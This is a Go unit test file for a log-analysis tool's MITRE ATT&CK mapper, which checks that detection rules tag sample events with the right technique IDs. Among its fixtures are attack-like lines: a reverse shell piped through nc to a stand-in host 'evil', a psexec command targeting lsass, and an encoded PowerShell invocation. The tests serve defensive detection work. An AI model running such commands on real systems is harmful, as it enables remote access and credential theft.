package mitre

import (
	"context"
	"database/sql"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"quetzalog/internal/database"
	"quetzalog/pkg/event"
)

func newMapper(t *testing.T) *Mapper {
	t.Helper()
	m, err := NewMapper()
	if err != nil {
		t.Fatalf("NewMapper: %v", err)
	}
	return m
}

func TestBuiltInRulesLoad(t *testing.T) {
	m := newMapper(t)
	rules := m.Rules()
	if len(rules) < 20 {
		t.Fatalf("built-in rules: %d, want >= 20", len(rules))
	}
	ids := map[string]bool{}
	for _, r := range rules {
		if ids[r.ID] {
			t.Errorf("duplicate rule id %s", r.ID)
		}
		ids[r.ID] = true
	}
}

func TestMatchEncodedPowerShell(t *testing.T) {
	m := newMapper(t)
	ev := &event.Event{
		Process: "powershell.exe",
		Message: "powershell.exe -NoProfile -EncodedCommand JABzAD0...",
	}
	maps := m.Match(ev)
	found := false
	for _, mp := range maps {
		if mp.Technique == "T1059.001" && mp.RuleID == "ps1-encoded-command" {
			found = true
			if mp.Confidence != 0.9 {
				t.Errorf("confidence %v", mp.Confidence)
			}
			if mp.Tactic != "TA0002" || mp.TechniqueName == "" {
				t.Errorf("mapping fields: %+v", mp)
			}
		}
	}
	if !found {
		t.Fatalf("encoded powershell not mapped: %+v", maps)
	}
}

func TestMatchMultipleTechniques(t *testing.T) {
	m := newMapper(t)
	// A psexec line that also names lsass → two techniques on one event.
	ev := &event.Event{
		Process: "psexec.exe",
		Message: `\\target C:\dump\psexec.exe -accepteula lsass.exe`,
	}
	maps := m.Match(ev)
	byID := map[string]Mapping{}
	for _, mp := range maps {
		byID[mp.Technique] = mp
	}
	if _, ok := byID["T1021"]; !ok {
		t.Errorf("psexec lateral mapping missing: %+v", maps)
	}
	if _, ok := byID["T1003.001"]; !ok {
		t.Errorf("lsass mapping missing: %+v", maps)
	}
}

func TestMatchNoFalsePositive(t *testing.T) {
	m := newMapper(t)
	// Benign web traffic must not map to T1190.
	ev := &event.Event{Message: `GET /index.html HTTP/1.1" 200`}
	if maps := m.Match(ev); len(maps) != 0 {
		t.Errorf("benign request mapped: %+v", maps)
	}
	// A normal powershell one-liner without encoding/web must not map.
	ev = &event.Event{Process: "powershell.exe", Message: "Get-Service | Out-GridView"}
	if maps := m.Match(ev); len(maps) != 0 {
		t.Errorf("benign powershell mapped: %+v", maps)
	}
}

func TestSourceTypeMatchesClassAttribute(t *testing.T) {
	m := newMapper(t)
	// The rule matches by normalized source_class attribute even when the
	// transport source_type is generic.
	ev := &event.Event{
		SourceType: "json",
		Service:    "sshd",
		Message:    "Failed password for root from 1.2.3.4 port 52222",
		Attributes: map[string]any{"source_class": "os.linux.sshd"},
	}
	maps := m.Match(ev)
	if len(maps) == 0 {
		t.Fatal("sshd failure not mapped via source_class")
	}
	if maps[0].Technique != "T1110.001" {
		t.Errorf("technique %v, want T1110.001", maps[0].Technique)
	}
}

func TestRegisterRuntimeRule(t *testing.T) {
	m := newMapper(t)
	// Unknown technique is rejected.
	if err := m.Register(&Rule{ID: "bad", Tactic: "TA0002", Technique: "T9999", Confidence: 0.5}); err == nil {
		t.Error("unknown technique accepted")
	}
	// Unknown tactic is rejected.
	if err := m.Register(&Rule{ID: "bad", Tactic: "TA9999", Technique: "T1059.001", Confidence: 0.5}); err == nil {
		t.Error("unknown tactic accepted")
	}
	// Bad regex is rejected.
	if err := m.Register(&Rule{ID: "bad", Tactic: "TA0002", Technique: "T1059.001", Confidence: 0.5,
		When: RuleWhen{MessageRegex: "(unclosed"}}); err == nil {
		t.Error("bad regex accepted")
	}
	// Valid runtime rule works, and re-registration replaces.
	r := &Rule{ID: "custom", Tactic: "TA0002", Technique: "T1059.004", Confidence: 0.99,
		When: RuleWhen{Process: "bash", MessageRegex: "reverse-shell-custom"}}
	if err := m.Register(r); err != nil {
		t.Fatalf("register: %v", err)
	}
	before := len(m.Rules())
	_ = m.Register(r)
	if len(m.Rules()) != before {
		t.Error("re-registration duplicated the rule")
	}
	ev := &event.Event{Process: "bash", Message: "bash -i | nc evil 4444 reverse-shell-custom"}
	maps := m.Match(ev)
	if len(maps) != 1 || maps[0].RuleID != "custom" || maps[0].Confidence != 0.99 {
		t.Errorf("custom rule mapping: %+v", maps)
	}
}

func TestEventMapperWritesAttribute(t *testing.T) {
	db, err := database.Open(":memory:", 5, 2, "5m")
	if err != nil {
		t.Fatalf("open: %v", err)
	}
	defer db.Close()
	if err := database.Migrate(db); err != nil {
		t.Fatalf("migrate: %v", err)
	}
	ctx := context.Background()
	m := newMapper(t)
	em := NewEventMapper(m, db, nil)
	em.Start(1)

	now := time.Now().UTC().Format(time.RFC3339)
	if _, err := db.ExecContext(ctx,
		`INSERT INTO events (id, timestamp, received_at, source, source_type, host, severity, message, process)
		 VALUES (?,?,?,?,?,?,?,?,?)`,
		"evt-mitre-1", now, now, "test", "syslog", "win1", "err",
		"powershell -EncodedCommand x", "powershell.exe"); err != nil {
		t.Fatalf("insert: %v", err)
	}
	em.Enqueue(&event.Event{ID: "evt-mitre-1", Host: "win1", Process: "powershell.exe",
		Message: "powershell -EncodedCommand x"})

	deadline := time.Now().Add(5 * time.Second)
	var attrs sql.NullString
	for time.Now().Before(deadline) {
		_ = db.QueryRowContext(ctx, `SELECT attributes FROM events WHERE id='evt-mitre-1'`).Scan(&attrs)
		if attrs.Valid && strings.Contains(attrs.String, "mitre") {
			break
		}
		time.Sleep(20 * time.Millisecond)
	}
	em.Stop()

	if !attrs.Valid || !strings.Contains(attrs.String, "T1059.001") {
		t.Fatalf("mitre.attack attribute missing: %v", attrs)
	}
	var m2 map[string]any
	if err := json.Unmarshal([]byte(attrs.String), &m2); err != nil {
		t.Fatalf("attributes json: %v", err)
	}
	attack, _ := m2["mitre"].(map[string]any)
	if attack == nil {
		t.Fatalf("no mitre block: %s", attrs.String)
	}
	if _, ok := attack["attack"].([]any); !ok {
		t.Errorf("mitre.attack not an array: %s", attrs.String)
	}
}
